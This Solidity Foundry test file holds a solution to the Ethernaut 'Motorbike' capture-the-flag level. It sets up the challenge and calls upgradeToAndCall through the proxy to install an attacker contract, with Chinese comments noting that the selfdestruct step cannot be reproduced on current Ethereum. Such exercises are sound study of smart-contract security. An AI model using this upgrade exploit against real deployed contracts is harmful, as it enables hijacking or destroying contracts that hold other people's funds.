// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";
import {Motorbike, Engine} from "../../src/ethernaut/25_Motorbike/Motorbike.sol";
import {Motorbike_Factory} from "../../src/ethernaut/25_Motorbike/Motorbike_Factory.sol";
import {Motorbike_Attacker} from "./25_Motorbike_Attacker.sol";

contract Motorbike_Test is Test {
	address deployer = makeAddr("deployer");
	address player = makeAddr("player");

	Motorbike_Factory factory;
	Motorbike instContract;
	
	modifier checkSolvedByPlayer() {
		vm.startPrank(player, player);
		_;
		vm.stopPrank();
		_isSolved();
	}
	
	/**
	 * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
	 */
	function _isSolved() private view {
		if (factory.validateInstance(player)) {
			console.log("\x1b[33m%s\x1b[0m", ">>>>>>>>>>>>>> Congratulations, you have successfully completed the challenge >>>>>>>>>>>>>>");
		} else {
			revert(">>>>>>>>>>>>>> Sorry, you failed the challenge >>>>>>>>>>>>>>");
		}
	}
	
	/**
	 * SETS UP CHALLENGE - DO NOT TOUCH
	 */
	function setUp() public {
		startHoax(deployer);
		
		factory = new Motorbike_Factory();
		instContract = Motorbike(payable(factory.createInstance(player)));
		
		vm.stopPrank();
		
		vm.deal(address(player), 101 ether);
	}
	
	function test__Solution_Motorbike() public checkSolvedByPlayer {
		// CODE YOUR SOLUTION HERE
		// forge test --mt test__Solution_Motorbike -vv
		
		// 阅读资料的时候，难以揣测。
		// 容易误认为`夺取控制权`
		// 本案相对特殊，让玩家直接扮演`权限持有者`。
		
		// 又一次涉及到 selfdestruct
		// 当前版本的以太坊以及Foundry，自然无法复现。
		// 只当是看看。
		
		Engine engineAsProxy = Engine(address(instContract));
	
		Motorbike_Attacker engineBadly = new Motorbike_Attacker(instContract);
		engineAsProxy.upgradeToAndCall(address(engineBadly), abi.encodeWithSelector(Motorbike_Attacker.initializeBadly.selector));
		
		vm.roll(block.number + 1);
	}
}
